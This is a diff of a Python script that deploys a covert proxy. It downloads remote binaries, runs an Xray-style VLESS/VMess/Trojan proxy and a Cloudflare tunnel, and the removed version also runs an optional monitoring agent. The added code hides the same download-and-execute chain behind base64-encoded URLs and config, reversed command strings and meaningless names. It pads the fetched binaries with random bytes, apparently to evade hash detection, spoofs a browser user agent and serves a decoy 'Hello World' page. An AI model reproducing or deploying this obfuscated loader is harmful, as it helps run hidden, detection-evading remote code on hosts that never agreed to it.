@@ -1,376 +1,205 @@
-import os
-import re
-import json
-import time
+import ast
 import base64
-import shutil
-import asyncio
-import requests
-import platform
+import glob
+import io
+import zipfile
+from os.path import join
+import random
+import urllib.request
+from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler, ThreadingHTTPServer
+import json
+import os.path
+import re
 import subprocess
+import sys as ysy
 import threading
-from threading import Thread
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import time
+import urllib
 
-# Environment variables
-UPLOAD_URL = os.environ.get('UPLOAD_URL', '')
-PROJECT_URL = os.environ.get('PROJECT_URL', '')        ,
-AUTO_ACCESS = os.environ.get('AUTO_ACCESS', 'false').lower() == 'true'  
-FILE_PATH = os.environ.get('FILE_PATH', './.cache')   
-SUB_PATH = os.environ.get('SUB_PATH', 'sub')           
-UUID = os.environ.get('UUID', '01010101-0101-0101-0101-010101010101')  
-NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')     
-NEZHA_PORT = os.environ.get('NEZHA_PORT', '')          
-NEZHA_KEY = os.environ.get('NEZHA_KEY', '')           
-ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', '')       
-ARGO_AUTH = os.environ.get('ARGO_AUTH', '')            
-ARGO_PORT = int(os.environ.get('ARGO_PORT', '8080'))   
-CFIP = os.environ.get('CFIP', 'www.visa.com.tw')       
-CFPORT = int(os.environ.get('CFPORT', '443'))         
-NAME = os.environ.get('NAME', 'streamlit')                   
-CHAT_ID = os.environ.get('CHAT_ID', '')                
-dog_TOKEN = os.environ.get('dog_TOKEN', '')           
-PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000) 
-
-# Create running folder
-def create_directory():
-    print('\033c', end='')
-    if not os.path.exists(FILE_PATH):
-        os.makedirs(FILE_PATH)
-        print(f"{FILE_PATH} is created")
-    else:
-        print(f"{FILE_PATH} already exists")
-
-# Global variables
-npm_path = os.path.join(FILE_PATH, 'npm')
-php_path = os.path.join(FILE_PATH, 'php')
-cat_path = os.path.join(FILE_PATH, 'cat')
-dog_path = os.path.join(FILE_PATH, 'dog')
-sub_path = os.path.join(FILE_PATH, 'sub.txt')
-list_path = os.path.join(FILE_PATH, 'list.txt')
-boot_log_path = os.path.join(FILE_PATH, 'boot.log')
-config_path = os.path.join(FILE_PATH, 'mouse.json')
-
-# Delete nodes
-def delete_nodes():
-    try:
-        if not UPLOAD_URL:
-            return
-
-        if not os.path.exists(sub_path):
-            return
-
-        try:
-            with open(sub_path, 'r') as file:
-                file_content = file.read()
-        except:
-            return None
-
-        decoded = base64.b64decode(file_content).decode('utf-8')
-        nodes = [line for line in decoded.split('\n') if any(protocol in line for protocol in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
-
-        if not nodes:
-            return
-
-        try:
-            requests.post(f"{UPLOAD_URL}/api/delete-nodes", 
-                          data=json.dumps({"nodes": nodes}),
-                          headers={"Content-Type": "application/json"})
-        except:
-            return None
-    except Exception as e:
-        print(f"Error in delete_nodes: {e}")
-        return None
-
-# Clean up old files
-def cleanup_old_files():
-    paths_to_delete = ['cat', 'dog', 'npm', 'php', 'boot.log', 'list.txt']
-    for file in paths_to_delete:
-        file_path = os.path.join(FILE_PATH, file)
-        try:
-            if os.path.exists(file_path):
-                if os.path.isdir(file_path):
-                    shutil.rmtree(file_path)
-                else:
-                    os.remove(file_path)
-        except Exception as e:
-            print(f"Error removing {file_path}: {e}")
-
-class RequestHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == '/':
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b'Hello World')
-            
-        elif self.path == f'/{SUB_PATH}':
-            try:
-                with open(sub_path, 'rb') as f:
-                    content = f.read()
-                self.send_response(200)
-                self.send_header('Content-type', 'text/plain')
-                self.end_headers()
-                self.wfile.write(content)
-            except:
-                self.send_response(404)
-                self.end_headers()
+_p_i_d = set()
+_s_m_a_p_s = dict()
+_c_w_d = os.getcwd()
+_h_o_s = ""
+_0_0_1 = "001"
+_0_0_2 = "002"
+_i_n_d = "aHR0cHM6Ly9naXRodWIuY29tL2Zlcm9oMS9jbG91ZGZsYXJlZC9yYXcvbWFpbi9hYmMyLnppcA=="
+_c_f_d = "aHR0cHM6Ly9naXRodWIuY29tL2Zlcm9oMS9jbG91ZGZsYXJlZC9yYXcvbWFpbi9jbG91ZGZsYXJlZC1saW51eC1hbWQ2NC56aXA="
+_u_a_c = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"
+_p_i_d_1 = random.randint(10000, 65535)
+while _p_i_d_1 in _p_i_d: _p_i_d_1 = random.randint(10000, 65535)
+_p_i_d.add(_p_i_d_1)
+_p_i_d_2 = random.randint(10000, 65535)
+while _p_i_d_2 in _p_i_d: _p_i_d_2 = random.randint(10000, 65535)
+_p_i_d.add(_p_i_d_2)
+_p_i_d_3 = random.randint(10000, 65535)
+while _p_i_d_3 in _p_i_d: _p_i_d_3 = random.randint(10000, 65535)
+_p_i_d.add(_p_i_d_3)
+_p_i_d_4 = random.randint(10000, 65535)
+while _p_i_d_4 in _p_i_d: _p_i_d_4 = random.randint(10000, 65535)
+_p_i_d.add(_p_i_d_4)
+_e_c_f = False
+_s_e_1 = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000) 
+_d_i_u = "01010101-0101-0101-0101-010101010101"
+_v_l_s = ""
+_v_m_s = ""
+_t_r_s = ""
+_i_n_d = base64.b64decode(_i_n_d.encode("utf8")).decode("utf8")
+_c_f_d = base64.b64decode(_c_f_d.encode("utf8")).decode("utf8")
+_h_a_s = ("eydpbmJvdW5kcyc6IFt7J3BvcnQnOiAwLCAncHJvdG9jb2wnOiAndmxlc3MnLCAnc2V0dGluZ3MnOiB7J2NsaWVudHMnOiBbeydpZCc6IC"
+          "cnLCAnZmxvdyc6ICd4dGxzLXJwcngtZGlyZWN0J31dLCAnZGVjcnlwdGlvbic6ICdub25lJywgJ2ZhbGxiYWNrcyc6IFt7J3BhdGgnOi"
+          "AnJywgJ2Rlc3QnOiAwfSwgeydwYXRoJzogJycsICdkZXN0JzogMH0sIHsncGF0aCc6ICcnLCAnZGVzdCc6IDB9LCB7J2Rlc3QnOiAwfV"
+          "19LCAnc3RyZWFtU2V0dGluZ3MnOiB7J25ldHdvcmsnOiAndGNwJ30sICdsaXN0ZW4nOiAnMC4wLjAuMCd9LCB7J3BvcnQnOiAwLCAnbG"
+          "lzdGVuJzogJzEyNy4wLjAuMScsICdwcm90b2NvbCc6ICd2bGVzcycsICdzZXR0aW5ncyc6IHsnY2xpZW50cyc6IFt7J2lkJzogJyd9XS"
+          "wgJ2RlY3J5cHRpb24nOiAnbm9uZSd9LCAnc3RyZWFtU2V0dGluZ3MnOiB7J25ldHdvcmsnOiAnd3MnLCAnd3NTZXR0aW5ncyc6IHsnc"
+          "GF0aCc6ICcnfX19LCB7J3BvcnQnOiAwLCAnbGlzdGVuJzogJzEyNy4wLjAuMScsICdwcm90b2NvbCc6ICd2bWVzcycsICdzZXR0aW5n"
+          "cyc6IHsnY2xpZW50cyc6IFt7J2lkJzogJyd9XX0sICdzdHJlYW1TZXR0aW5ncyc6IHsnbmV0d29yayc6ICd3cycsICdzZWN1cml0eSc"
+          "6ICdub25lJywgJ3dzU2V0dGluZ3MnOiB7J3BhdGgnOiAnJ319fSwgeydwb3J0JzogMCwgJ2xpc3Rlbic6ICcxMjcuMC4wLjEnLCAncHJvd"
+          "G9jb2wnOiAndHJvamFuJywgJ3NldHRpbmdzJzogeydjbGllbnRzJzogW3sncGFzc3dvcmQnOiAnJ31dfSwgJ3N0cmVhbVNldHRpbmdzJ"
+          "zogeyduZXR3b3JrJzogJ3dzJywgJ3NlY3VyaXR5JzogJ25vbmUnLCAnd3NTZXR0aW5ncyc6IHsncGF0aCc6ICcnfX19XSwgJ3JvdXRpbm"
+          "cnOiB7J2RvbWFpblN0cmF0ZWd5JzogJ0lQSWZOb25NYXRjaCcsICdydWxlcyc6IFt7J3R5cGUnOiAnZmllbGQnLCAncG9ydCc6ICcwLT"
+          "Y1NTM1JywgJ291dGJvdW5kVGFnJzogJ2RpcmVjdCcsICdlbmFibGVkJzogVHJ1ZX1dfSwnbG9nJzogeydsb2dsZXZlbCc6ICdub25lJ30s"
+          "ICdvdXRib3VuZHMnOiBbeydwcm90b2NvbCc6ICdmcmVlZG9tJywgJ3RhZyc6ICdkaXJlY3QnfV0sfQ==")
+if len(_v_l_s) == 0: _v_l_s = "/" + _d_i_u[0:8] + "_" + _d_i_u[9:13]
+if len(_v_m_s) == 0: _v_m_s = "/" + _d_i_u[0:8] + "_" + _d_i_u[14:18]
+if len(_t_r_s) == 0: _t_r_s = "/" + _d_i_u[0:8] + "_" + _d_i_u[19:23]
+_f_x_1 = [i for i in os.listdir() if i.endswith(_0_0_1) and os.path.isfile(i) and os.path.getsize(i) > 0x1f4000]
+_f_c_1 = os.path.join(os.getcwd(),
+                      ".1"[0].join(["".join([str(i) for i in _p_i_d])[0: random.randint(1, 11)], _0_0_1]) if len(
+                          _f_x_1) == 0 else _f_x_1[0])
+_f_x_2 = [i for i in os.listdir() if i.endswith(_0_0_2) and os.path.isfile(i) and os.path.getsize(i) > 0x1f4000]
+_f_c_2 = os.path.join(os.getcwd(),
+                      ".2"[0].join(["".join([str(i) for i in _p_i_d])[0: random.randint(1, 11)], _0_0_2]) if len(
+                          _f_x_2) == 0 else _f_x_2[0])
+_s_m_a_p_s.update({
+    "aW5ib3VuZHMuMC5saXN0ZW4=": ".".join(["0", "0", "0", "0"]),
+    "aW5ib3VuZHMuMC5wb3J0": _s_e_1,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5jbGllbnRzLjAuaWQ=": _d_i_u,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMC5wYXRo": _v_l_s,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMC5kZXN0": _p_i_d_1,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMS5wYXRo": _v_m_s,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMS5kZXN0": _p_i_d_2,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMi5wYXRo": _t_r_s,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMi5kZXN0": _p_i_d_3,
+    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMy5kZXN0": _p_i_d_4,
+    "aW5ib3VuZHMuMS5wb3J0": _p_i_d_1,
+    "aW5ib3VuZHMuMS5zZXR0aW5ncy5jbGllbnRzLjAuaWQ=": _d_i_u,
+    "aW5ib3VuZHMuMS5zdHJlYW1TZXR0aW5ncy53c1NldHRpbmdzLnBhdGg=": _v_l_s,
+    "aW5ib3VuZHMuMi5wb3J0": _p_i_d_2,
+    "aW5ib3VuZHMuMi5zZXR0aW5ncy5jbGllbnRzLjAuaWQ=": _d_i_u,
+    "aW5ib3VuZHMuMi5zdHJlYW1TZXR0aW5ncy53c1NldHRpbmdzLnBhdGg=": _v_m_s,
+    "aW5ib3VuZHMuMy5wb3J0": _p_i_d_3,
+    "aW5ib3VuZHMuMy5zZXR0aW5ncy5jbGllbnRzLjAucGFzc3dvcmQ=": _d_i_u,
+    "aW5ib3VuZHMuMy5zdHJlYW1TZXR0aW5ncy53c1NldHRpbmdzLnBhdGg=": _t_r_s,
+})
+_d_h_a = ast.literal_eval(base64.b64decode(_h_a_s.encode("utf8")).decode("utf8"))
+for k, v in _s_m_a_p_s.items():
+    k = base64.b64decode(k.encode("utf8")).decode("utf8")
+    _map = _d_h_a
+    _kk = k.split(".")
+    for jk in _kk[:-1]:
+        if jk.isdigit():
+            _map = _map[int(jk)]
         else:
-            self.send_response(404)
-            self.end_headers()
+            _map = _map[jk]
+    else:
+        _map[_kk[-1]] = v
+
+
+def _f_c_h(_b_a_i, _u_r_a, _p_a_t):
+    if os.path.isfile(_b_a_i): return
+    _file = glob.glob(join(_c_w_d, f"*.zip"))
+    if len(_file) > 0:
+        for _file in _file[:]:
+            try:
+                with zipfile.ZipFile(_file) as z:
+                    for i in z.namelist():
+                        if not re.search(_p_a_t, i): continue
+                        with open(_b_a_i, 'wb') as c:
+                            c.write(z.read(i))
+                            c.write(b"\0" * random.randint(0x0, 0x201000 * 2))
+                            break
+            except Exception as e:
+                print(str(e))
+                os.remove(_file)
+            else:
+                os.remove(_file)
+    else:
+        with open(join(
+                _c_w_d, ".".join((os.path.splitext(_b_a_i)[0], "zip"))), "wb") as _f:
+            headers = {
+                "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                "Accept-Encoding": 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                "Accept-Language": 'en-US,en;q=0.5',
+                'User-Agent': _u_a_c,
+            }
+            timeout = random.uniform(6, 10)
+            req = urllib.request.Request(_u_r_a, headers=headers)
+            response = urllib.request.urlopen(req, timeout=timeout)
+            content = response.read()
+            response.close()
+            _f.write(content)
+    _f_c_h(_b_a_i, _u_r_a, _p_a_t)
+
+
+def _r_c_f():
+    global _h_o_s
+    while True:
+        _s_p_p = subprocess.Popen([_f_c_2, "lennut"[::-1], "lru--"[::-1], ":1.0.0.721//:ptth"[::-1] + str(_s_e_1),
+                                   "etadpuotua-on--"[::-1], ], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, )
+        while _s_p_p.poll() is None:
+            _d_s_x = _s_p_p.stdout.readline().decode("utf8")
+            _r_e_o = re.search(r"://([\w\-]{10,}\.trycloudflare\.com)", _d_s_x)
+            if _r_e_o: _h_o_s = _r_e_o.group(1)
+        time.sleep(10)
+
+
+def _r_x_y():
+    global _h_o_s
+    while True:
+        subprocess.run([_f_c_1, "nur"[::-1], ],
+                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                       input=json.dumps(_d_h_a, ).encode('utf8'))
+        time.sleep(10)
+
+
+class MyRequestHandler(SimpleHTTPRequestHandler):
+    server_version = ''
+    sys_version = ''
 
     def log_message(self, format, *args):
         pass
-    
-# Determine system architecture
-def get_system_architecture():
-    architecture = platform.machine().lower()
-    if 'arm' in architecture or 'aarch64' in architecture:
-        return 'arm'
-    else:
-        return 'amd'
 
-# Download file based on architecture
-def download_file(file_name, file_url):
-    file_path = os.path.join(FILE_PATH, file_name)
-    try:
-        response = requests.get(file_url, stream=True)
-        response.raise_for_status()
-        
-        with open(file_path, 'wb') as f:
-            for chunk in response.iter_content(chunk_size=8192):
-                f.write(chunk)
-        
-        print(f"Download {file_name} successfully")
-        return True
-    except Exception as e:
-        if os.path.exists(file_path):
-            os.remove(file_path)
-        print(f"Download {file_name} failed: {e}")
-        return False
-
-# Get files for architecture
-def get_files_for_architecture(architecture):
-    if architecture == 'arm':
-        base_files = [
-            {"fileName": "cat", "fileUrl": "https://arm64.ssss.nyc.mn/web"},
-            {"fileName": "dog", "fileUrl": "https://arm64.ssss.nyc.mn/2go"}
-        ]
-    else:
-        base_files = [
-            {"fileName": "cat", "fileUrl": "https://amd64.ssss.nyc.mn/web"},
-            {"fileName": "dog", "fileUrl": "https://amd64.ssss.nyc.mn/2go"}
-        ]
-
-    if NEZHA_SERVER and NEZHA_KEY:
-        if NEZHA_PORT:
-            npm_url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
-            base_files.insert(0, {"fileName": "npm", "fileUrl": npm_url})
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        if self.path == "/123":
+            self.wfile.write(f"""<!DOCTYPE html><html lang="en">
+<head><meta charset="UTF-8"><title>Title</title>
+</head><body><h4>{_h_o_s if _e_c_f else "not enabled."}</h4></body></html>""".encode("utf8"))
         else:
-            php_url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
-            base_files.insert(0, {"fileName": "php", "fileUrl": php_url})
-
-    return base_files
-
-# Authorize files with execute permission
-def authorize_files(file_paths):
-    for relative_file_path in file_paths:
-        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
-        if os.path.exists(absolute_file_path):
-            try:
-                os.chmod(absolute_file_path, 0o775)
-                print(f"Empowerment success for {absolute_file_path}: 775")
-            except Exception as e:
-                print(f"Empowerment failed for {absolute_file_path}: {e}")
-
-# Configure Argo tunnel
-def argo_type():
-    if not ARGO_AUTH or not ARGO_DOMAIN:
-        print("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels")
-        return
-
-    if "TunnelSecret" in ARGO_AUTH:
-        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
-            f.write(ARGO_AUTH)
-        
-        tunnel_id = ARGO_AUTH.split('"')[11]
-        tunnel_yml = f"""
-tunnel: {tunnel_id}
-credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
-protocol: http2
-
-ingress:
-  - hostname: {ARGO_DOMAIN}
-    service: http://localhost:{ARGO_PORT}
-    originRequest:
-      noTLSVerify: true
-  - service: http_status:404
-"""
-        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
-            f.write(tunnel_yml)
-    else:
-        print("Use token connect to tunnel,please set the {ARGO_PORT} in cloudflare")
+            self.wfile.write(b'Hello World')
+        return SimpleHTTPRequestHandler
 
 
-# Execute shell command and return output
-def exec_cmd(command):
-    try:
-        process = subprocess.Popen(
-            command, 
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        stdout, stderr = process.communicate()
-        return stdout + stderr
-    except Exception as e:
-        print(f"Error executing command: {e}")
-        return str(e)
-
-# Download and run necessary files
-async def download_files_and_run():
-    global private_key, public_key
-    
-    architecture = get_system_architecture()
-    files_to_download = get_files_for_architecture(architecture)
-    
-    if not files_to_download:
-        print("Can't find a file for the current architecture")
-        return
-    
-    # Download all files
-    download_success = True
-    for file_info in files_to_download:
-        if not download_file(file_info["fileName"], file_info["fileUrl"]):
-            download_success = False
-    
-    if not download_success:
-        print("Error downloading files")
-        return
-    
-    # Authorize files
-    files_to_authorize = ['npm', 'cat', 'dog'] if NEZHA_PORT else ['php', 'cat', 'dog']
-    authorize_files(files_to_authorize)
-    
-   
-    
-    # Generate configuration file
-    config ={"log":{"access":"/dev/null","error":"/dev/null","loglevel":"none",},"inbounds":[{"port":ARGO_PORT ,"protocol":"vless","settings":{"clients":[{"id":UUID ,"flow":"xtls-rprx-vision",},],"decryption":"none","fallbacks":[{"dest":3001 },{"path":"/vless-argo","dest":3002 },{"path":"/vmess-argo","dest":3003 },{"path":"/trojan-argo","dest":3004 },],},"streamSettings":{"network":"tcp",},},{"port":3001 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":UUID },],"decryption":"none"},"streamSettings":{"network":"ws","security":"none"}},{"port":3002 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":UUID ,"level":0 }],"decryption":"none"},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/vless-argo"}},"sniffing":{"enabled":False ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3003 ,"listen":"127.0.0.1","protocol":"vmess","settings":{"clients":[{"id":UUID ,"alterId":0 }]},"streamSettings":{"network":"ws","wsSettings":{"path":"/vmess-argo"}},"sniffing":{"enabled":False ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3004 ,"listen":"127.0.0.1","protocol":"trojan","settings":{"clients":[{"password":UUID },]},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/trojan-argo"}},"sniffing":{"enabled":False ,"destOverride":["http","tls","quic"],"metadataOnly":False }},],"outbounds":[{"protocol":"freedom","tag": "direct" },{"protocol":"blackhole","tag":"block"}]}
-    with open(os.path.join(FILE_PATH, 'mouse.json'), 'w', encoding='utf-8') as config_file:
-        json.dump(config, config_file, ensure_ascii=False, indent=2)
-    
-       
-    # Run sbX
-    command = f"nohup {os.path.join(FILE_PATH, 'cat')} -c {os.path.join(FILE_PATH, 'mouse.json')} >/dev/null 2>&1 &"
-    try:
-        exec_cmd(command)
-        print('cat is running')
-        time.sleep(1)
-    except Exception as e:
-        print(f"cat running error: {e}")
-    
-    # Run cloudflared
-    if os.path.exists(os.path.join(FILE_PATH, 'dog')):
-        if re.match(r'^[A-Z0-9a-z=]{120,250}$', ARGO_AUTH):
-            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH}"
-        elif "TunnelSecret" in ARGO_AUTH:
-            args = f"tunnel --edge-ip-version auto --config {os.path.join(FILE_PATH, 'tunnel.yml')} run"
-        else:
-            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {os.path.join(FILE_PATH, 'boot.log')} --loglevel info --url http://localhost:{ARGO_PORT}"
-        
-        try:
-            exec_cmd(f"nohup {os.path.join(FILE_PATH, 'dog')} {args} >/dev/null 2>&1 &")
-            print('dog is running')
-            time.sleep(2)
-        except Exception as e:
-            print(f"Error executing command: {e}")
-    
-    time.sleep(5)
-    
-    # Extract domains and generate sub.txt
-    await extract_domains()
-
-# Extract domains from cloudflared logs
-async def extract_domains():
-    argo_domain = None
-
-    if ARGO_AUTH and ARGO_DOMAIN:
-        argo_domain = ARGO_DOMAIN
-        print(f'ARGO_DOMAIN: {argo_domain}')
-        await generate_links(argo_domain)
-    else:
-        try:
-            with open(boot_log_path, 'r') as f:
-                file_content = f.read()
-            
-            lines = file_content.split('\n')
-            argo_domains = []
-            
-            for line in lines:
-                domain_match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)
-                if domain_match:
-                    domain = domain_match.group(1)
-                    argo_domains.append(domain)
-            
-            if argo_domains:
-                argo_domain = argo_domains[0]
-                print(f'ArgoDomain: {argo_domain}')
-                await generate_links(argo_domain)
-            else:
-                print('ArgoDomain not found, re-running dog to obtain ArgoDomain')
-                # Remove boot.log and restart dog
-                if os.path.exists(boot_log_path):
-                    os.remove(boot_log_path)
-                
-                try:
-                    exec_cmd('pkill -f "[b]ot" > /dev/null 2>&1')
-                except:
-                    pass
-                
-                time.sleep(1)
-                args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{ARGO_PORT}'
-                exec_cmd(f'nohup {os.path.join(FILE_PATH, "dog")} {args} >/dev/null 2>&1 &')
-                print('dog is running.')
-                time.sleep(6)  # Wait 6 seconds
-                await extract_domains()  # Try again
-        except Exception as e:
-            print(f'Error reading boot.log: {e}')
+def _s_s_r():
+    httpd = HTTPServer(('0.0.0.0', _p_i_d_4), MyRequestHandler)
+    httpd.serve_forever()
 
 
-    
-
-
-    
-# Main function to start the server
-async def start_server():
-    delete_nodes()
-    cleanup_old_files()
-    create_directory()
-    argo_type()
-    await download_files_and_run()
-    add_visit_task()
-    
-    server_thread = Thread(target=run_server)
-    server_thread.daemon = True
-    server_thread.start()   
-    
-    clean_files()
-    
-def run_server():
-    server = HTTPServer(('0.0.0.0', PORT), RequestHandler)
-    print(f"Server is running on port {PORT}")
-    print(f"Running done！")
-    print(f"\nLogs will be delete in 90 seconds")
-    server.serve_forever()
-    
-def run_async():
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_server()) 
-    
-    while True:
-        time.sleep(3600)
-        
-if __name__ == "__main__":
-    run_async()
+_f_c_h(_f_c_1, _i_n_d, r"^[X0x1]{1,}[R1r2]{1,}[A2a3]{1,}[Y3y4]{1,}")
+if "cf" in ysy.argv or _e_c_f:
+    _f_c_h(_f_c_2, _c_f_d, r"^[Cc]{1,}[Ll]{1,}[Oo]{1,}[Uu]{1,}[Dd]{1,}")
+try:
+    os.chmod(_f_c_1, 0o777, )
+    os.chmod(_f_c_2, 0o777, )
+except Exception as e:
+    pass
+if "init" in ysy.argv: ysy.exit(0)
+threading.Thread(target=_s_s_r, daemon=True).start()
+if "cf" in ysy.argv or _e_c_f:
+    threading.Thread(target=_r_c_f, daemon=True).start()
+threading.Thread(target=_r_x_y, daemon=True).start()
+while True: time.sleep(1)
+exit(0)
